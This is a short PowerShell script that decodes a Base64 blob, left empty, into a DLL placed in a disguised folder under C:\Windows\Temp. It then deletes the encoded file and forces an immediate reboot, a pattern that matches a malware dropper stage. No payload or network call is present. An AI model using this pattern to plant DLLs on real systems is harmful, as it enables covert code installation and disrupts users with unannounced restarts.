# Define file paths
$b64File = "C:\Windows\Temp\.net\foldername=\payload.b64"
$outputFile = "C:\Windows\Temp\.net\foldername=\test.dll"

# Write Base64 content to file (replace with actual Base64 string)
$base64Data = ""
Set-Content -Path $b64File -Value $base64Data

# Decode Base64 and write to output file
try {
    # Read Base64 content and clean up any spaces or newlines
    $base64String = Get-Content -Path $b64File -Raw
    $base64String = $base64String -replace '[^A-Za-z0-9+/=]', ''  # Remove any non-Base64 characters

    # Validate the length (it should be a multiple of 4)
    if ($base64String.Length % 4 -ne 0) {
        $base64String = $base64String.PadRight($base64String.Length + (4 - $base64String.Length % 4), '=')
    }

    # Decode and write to the DLL file
    $decodedBytes = [System.Convert]::FromBase64String($base64String)
    [System.IO.File]::WriteAllBytes($outputFile, $decodedBytes)

} catch {
    Write-Error "An error occurred during decoding: $_"
}

# Clean up
Remove-Item -Path $b64File -Force

# Restart the system
shutdown /r /t 0
